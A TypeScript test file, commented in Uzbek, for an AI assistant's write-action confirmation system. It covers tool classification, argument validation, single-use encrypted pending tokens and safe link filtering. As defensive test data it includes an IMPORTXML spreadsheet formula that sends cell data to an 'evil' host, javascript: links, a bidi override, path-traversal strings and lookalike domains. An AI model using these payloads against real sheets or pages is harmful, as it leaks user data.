/**
 * Lokal test (tarmoqsiz): npx tsx --conditions=react-server src/lib/ai/connector-confirm.test.ts
 * Connector yozish amallarini tasdiqlash: read/write klassifikatori, argument validatsiyasi, server
 * xulosasi, kutilayotgan amal saqlovchilari (Redis/xotira KV va shifrlangan token) — bir martalik,
 * muddat, boshqa foydalanuvchi, tokenni o'zgartirish; mijozdagi normalizatsiya va havola filtri.
 */
import assert from "node:assert/strict";
import {
  CONFIRM_TTL_MS,
  classifyTool,
  connectorOf,
  isWriteTool,
  normalizeConfirmEvent,
  READ_ONLY_TOOLS,
  safeConnectorLink,
} from "./connector-confirm-types";
import {
  buildSummary,
  confirmSecrets,
  kvPendingStore,
  memoryKV,
  tokenPendingStore,
  validateActionArgs,
  type ConfirmKV,
  type PendingInput,
  type PendingStore,
} from "./connector-confirm";

let passed = 0;
let failed = 0;
async function test(name: string, fn: () => void | Promise<void>) {
  try {
    await fn();
    passed++;
  } catch (e) {
    failed++;
    console.error(`✕ ${name}\n  ${(e as Error).message.split("\n").join("\n  ")}`);
  }
}

const ALICE = "11111111-1111-4111-8111-111111111111";
const BOB = "22222222-2222-4222-8222-222222222222";
const SHEET = "1AbCdEfGhIjKlMnOpQrStUvWxYz0123456789_-abc";
const EVIL = "1EvIlEvIlEvIlEvIlEvIlEvIlEvIlEvIlEvIl_-xyz";
const SECRET = "test-secret-0123456789abcdef-XYZ";

const input = (over: Partial<PendingInput> = {}): PendingInput => ({
  uid: ALICE,
  connector: "gsheets",
  tool: "gsheets_append",
  args: { spreadsheet_id: SHEET, rows: [["a", "b"]] },
  ...over,
});

/** Upstash'ga o'xshash soxta KV (JSON'ni avtomatik deserializatsiya qiladi — Upstash kabi). */
function fakeRedis(): ConfirmKV & { size: () => number } {
  const m = new Map<string, string>();
  return {
    async set(k, v) {
      m.set(k, v);
    },
    async getdel(k) {
      const v = m.get(k);
      m.delete(k);
      return v === undefined ? null : JSON.parse(v);
    },
    size: () => m.size,
  };
}

async function main() {
  /* ---------------- Klassifikator ---------------- */

  await test("o'qish toollari — read", () => {
    for (const n of ["gsheets_read", "gmail_list", "gmail_top_senders", "gcalendar_list", "figma_get_file", "github_read_file", "github_get_repo", "public_weather"]) {
      assert.equal(classifyTool(n), "read", n);
    }
  });

  await test("yozish toollari — write", () => {
    for (const n of ["gsheets_create", "gsheets_append", "gslides_create"]) assert.equal(classifyTool(n), "write", n);
  });

  await test("MCP — har doim write (hatto nomi 'read'/'get' bo'lsa ham)", () => {
    assert.equal(classifyTool("mcp__read_file"), "write");
    assert.equal(classifyTool("mcp__get_weather"), "write");
    assert.equal(isWriteTool("mcp__send_email"), true);
  });

  await test("noma'lum / kelajakdagi tool — write (standart: rad)", () => {
    assert.equal(classifyTool("gmail_send"), "write");
    assert.equal(classifyTool("gcalendar_create_event"), "write");
    assert.equal(classifyTool(""), "write");
    assert.equal(classifyTool("GSHEETS_READ"), "write");
  });

  await test("read ro'yxatida hech bir yozish so'zi yo'q", () => {
    for (const n of READ_ONLY_TOOLS) assert.ok(!/(^|_)(create|append|send|write|delete|update|insert|post)(_|$)/.test(n), n);
  });

  await test("connectorOf", () => {
    assert.equal(connectorOf("gsheets_append"), "gsheets");
    assert.equal(connectorOf("gslides_create"), "gslides");
    assert.equal(connectorOf("mcp__x"), "mcp");
    assert.equal(connectorOf("gmail_send"), null);
  });

  /* ---------------- Validatsiya ---------------- */

  await test("gsheets_create — normallashtiriladi, ortiqcha maydon tashlanadi, raqam matnga", () => {
    const v = validateActionArgs("gsheets_create", { title: "  Hisobot‮  ", rows: [["a", 1, true, null]], extra: "x" });
    assert.ok(v.ok);
    if (v.ok) assert.deepEqual(v.args, { title: "Hisobot", rows: [["a", "1", "true", ""]] });
  });

  await test("gsheets_create — nomsiz rad", () => {
    assert.equal(validateActionArgs("gsheets_create", { title: "  " }).ok, false);
  });

  await test("gsheets_append — ID URL'dan ajratiladi; yaroqsiz ID / bo'sh qatorlar rad", () => {
    const v = validateActionArgs("gsheets_append", { spreadsheet_id: `https://docs.google.com/spreadsheets/d/${SHEET}/edit`, rows: [["x"]] });
    assert.ok(v.ok);
    if (v.ok) assert.equal(v.args.spreadsheet_id, SHEET);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: "../x", rows: [["x"]] }).ok, false);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: SHEET, rows: [] }).ok, false);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: SHEET, rows: [[{ a: 1 }]] }).ok, false);
  });

  await test("hajm chegaralari", () => {
    const many = Array.from({ length: 501 }, () => ["x"]);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: SHEET, rows: many }).ok, false);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: SHEET, rows: [Array.from({ length: 51 }, () => "x")] }).ok, false);
    assert.equal(validateActionArgs("gsheets_append", { spreadsheet_id: SHEET, rows: [["x".repeat(5001)]] }).ok, false);
    assert.equal(validateActionArgs("mcp__big", { blob: "x".repeat(20_000) }).ok, false);
  });

  await test("o'qish tooli va qo'llab-quvvatlanmaydigan yozish — rad", () => {
    assert.equal(validateActionArgs("gsheets_read", { spreadsheet_id: SHEET }).ok, false);
    assert.equal(validateActionArgs("gmail_send", { to: "a@b.c" }).ok, false);
    assert.equal(validateActionArgs("gsheets_create", ["x"]).ok, false);
  });

  /* ---------------- Xulosa ---------------- */

  await test("buildSummary — kataklar kesiladi, formula sanaladi, faqat 5 qator", () => {
    const rows = Array.from({ length: 8 }, (_, i) => [`=IMPORTXML("https://evil/?"&A${i})`, "y".repeat(200)]);
    const s = buildSummary("gsheets_append", { spreadsheet_id: SHEET, rows });
    assert.equal(s.kind, "sheets_append");
    if (s.kind === "sheets_append") {
      assert.equal(s.rows, 8);
      assert.equal(s.cols, 2);
      assert.equal(s.preview.length, 5);
      assert.ok(s.preview[0][1].length <= 80);
      assert.equal(s.formulas, 8);
      assert.equal(s.spreadsheetId, SHEET);
    }
  });

  await test("buildSummary — MCP: host va tool nomi, argumentlar kesiladi", () => {
    const s = buildSummary("mcp__send", { text: "z".repeat(2000) }, "https://mcp.example.com/api");
    assert.equal(s.kind, "mcp");
    if (s.kind === "mcp") {
      assert.equal(s.host, "mcp.example.com");
      assert.equal(s.tool, "send");
      assert.ok(s.argsPreview.length <= 600);
    }
  });

  /* ---------------- KV store (Redis / xotira) ---------------- */

  const stores: [string, () => PendingStore][] = [
    ["redis (soxta)", () => kvPendingStore(fakeRedis(), "redis")],
    ["xotira", () => kvPendingStore(memoryKV(), "memory")],
    ["token", () => tokenPendingStore([SECRET])],
  ];

  for (const [label, make] of stores) {
    await test(`${label}: put → take — yozuv qaytadi (args serverdan)`, async () => {
      const st = make();
      const { ref, exp, id } = await st.put(input());
      assert.ok(exp > Date.now());
      const r = await st.take(ref, ALICE);
      assert.ok(r.ok);
      if (r.ok) {
        assert.equal(r.action.id, id);
        assert.equal(r.action.tool, "gsheets_append");
        assert.deepEqual(r.action.args, { spreadsheet_id: SHEET, rows: [["a", "b"]] });
      }
    });

    await test(`${label}: bir martalik — ikkinchi take rad`, async () => {
      const st = make();
      const { ref } = await st.put(input());
      assert.ok((await st.take(ref, ALICE)).ok);
      const again = await st.take(ref, ALICE);
      assert.equal(again.ok, false);
    });

    await test(`${label}: boshqa foydalanuvchi — rad, egasi uchun esa yozuv buzilmaydi`, async () => {
      const st = make();
      const { ref } = await st.put(input());
      assert.equal((await st.take(ref, BOB)).ok, false);
      assert.equal((await st.take(ref, "")).ok, false);
      assert.ok((await st.take(ref, ALICE)).ok);
    });

    await test(`${label}: muddati o'tgan — expired`, async () => {
      const st = make();
      const t0 = Date.now();
      const { ref } = await st.put(input(), t0);
      const r = await st.take(ref, ALICE, t0 + CONFIRM_TTL_MS + 1);
      assert.equal(r.ok, false);
      if (!r.ok) assert.equal(r.reason, "expired");
    });

    await test(`${label}: yaroqsiz ref — invalid`, async () => {
      const st = make();
      for (const bad of ["", "x", "r1.", "t1.a.b.c.d", "../../etc", "r1.short"]) {
        const r = await st.take(bad, ALICE);
        assert.equal(r.ok, false, bad);
      }
    });
  }

  await test("KV: kalitda userId — Bob ref'ni ishlatolmaydi va Alice'nikini o'chirolmaydi", async () => {
    const kv = fakeRedis();
    const st = kvPendingStore(kv, "redis");
    const { ref } = await st.put(input());
    await st.take(ref, BOB);
    assert.equal(kv.size(), 1);
  });

  /* ---------------- Token: o'zgartirish (tampering) ---------------- */

  await test("token: args mijozda ko'rinmaydi (shifrlangan)", async () => {
    const st = tokenPendingStore([SECRET]);
    const { ref } = await st.put(input({ args: { spreadsheet_id: SHEET, rows: [["maxfiy-qiymat"]] } }));
    assert.ok(!ref.includes(SHEET));
    assert.ok(!Buffer.from(ref.split(".")[3], "base64url").toString("utf8").includes("maxfiy"));
  });

  await test("token: shifrmatnning har qanday bayti o'zgarsa — invalid", async () => {
    const st = tokenPendingStore([SECRET]);
    const { ref } = await st.put(input());
    const parts = ref.split(".");
    const ct = Buffer.from(parts[3], "base64url");
    for (const i of [0, Math.floor(ct.length / 2), ct.length - 1]) {
      const c2 = Buffer.from(ct);
      c2[i] ^= 0x01;
      const bad = [...parts.slice(0, 3), c2.toString("base64url"), parts[4]].join(".");
      const r = await st.take(bad, ALICE);
      assert.equal(r.ok, false);
      if (!r.ok) assert.equal(r.reason, "invalid");
    }
  });

  await test("token: boshqa tokenning bo'lagini ulash (args almashtirish) — invalid", async () => {
    const st = tokenPendingStore([SECRET]);
    const a = (await st.put(input())).ref.split(".");
    const b = (await st.put(input({ args: { spreadsheet_id: EVIL, rows: [["x"]] } }))).ref.split(".");
    const mixed = [a[0], a[1], a[2], b[3], a[4]].join(".");
    assert.equal((await st.take(mixed, ALICE)).ok, false);
  });

  await test("token: boshqa sir bilan yaratilgan token — invalid; rotatsiya (PREV) — qabul", async () => {
    const old = tokenPendingStore(["old-secret-0123456789abcdef"]);
    const { ref } = await old.put(input());
    assert.equal((await tokenPendingStore([SECRET]).take(ref, ALICE)).ok, false);
    assert.ok((await tokenPendingStore([SECRET, "old-secret-0123456789abcdef"]).take(ref, ALICE)).ok);
  });

  await test("token: qisqa sir — xato (imzosiz token yaratilmaydi)", () => {
    assert.throws(() => tokenPendingStore(["short"]));
  });

  await test("confirmSecrets: CONNECTOR_TOKEN_KEY → CRON_SECRET, PREV, qisqalari tashlanadi", () => {
    assert.deepEqual(confirmSecrets({ CONNECTOR_TOKEN_KEY: "k".repeat(32), CRON_SECRET: "c".repeat(32) }), ["k".repeat(32)]);
    assert.deepEqual(confirmSecrets({ CRON_SECRET: "c".repeat(32), CONNECTOR_TOKEN_KEY_PREV: "p".repeat(32) }), ["c".repeat(32), "p".repeat(32)]);
    assert.deepEqual(confirmSecrets({ CRON_SECRET: "short" }), []);
  });

  /* ---------------- Mijoz: normalizatsiya va havola ---------------- */

  const ev = {
    type: "connector_confirm",
    id: "abcdEFGH12345678",
    ref: "r1.abcdEFGH12345678",
    connector: "gsheets",
    tool: "gsheets_create",
    summary: { kind: "sheets_create", title: "[x](javascript:alert(1))‮", rows: 2, cols: 1, preview: [["a"], ["b"]], formulas: 0 },
    expiresAt: Date.now() + 60_000,
  };

  await test("normalizeConfirmEvent — to'g'ri hodisa, matn oddiy (bidi olib tashlanadi)", () => {
    const n = normalizeConfirmEvent(ev);
    assert.ok(n);
    if (n && n.summary.kind === "sheets_create") assert.equal(n.summary.title, "[x](javascript:alert(1))");
  });

  await test("normalizeConfirmEvent — mos kelmagan tool/connector/kind yoki read tool — null", () => {
    assert.equal(normalizeConfirmEvent({ ...ev, tool: "gsheets_read" }), null);
    assert.equal(normalizeConfirmEvent({ ...ev, connector: "mcp" }), null);
    assert.equal(normalizeConfirmEvent({ ...ev, summary: { ...ev.summary, kind: "slides_create" } }), null);
    assert.equal(normalizeConfirmEvent({ ...ev, ref: "<script>" }), null);
    assert.equal(normalizeConfirmEvent({ ...ev, type: "text" }), null);
  });

  await test("safeConnectorLink — faqat https://docs.google.com", () => {
    assert.equal(safeConnectorLink(`https://docs.google.com/spreadsheets/d/${SHEET}/edit`), `https://docs.google.com/spreadsheets/d/${SHEET}/edit`);
    assert.equal(safeConnectorLink("http://docs.google.com/x"), null);
    assert.equal(safeConnectorLink("https://docs.google.com.evil.io/x"), null);
    assert.equal(safeConnectorLink("https://user@docs.google.com/x"), null);
    assert.equal(safeConnectorLink("javascript:alert(1)"), null);
    assert.equal(safeConnectorLink("https://evil.example/docs.google.com"), null);
  });

  console.log(`connector-confirm: ${passed} o'tdi, ${failed} yiqildi`);
  if (failed) process.exit(1);
}

void main();
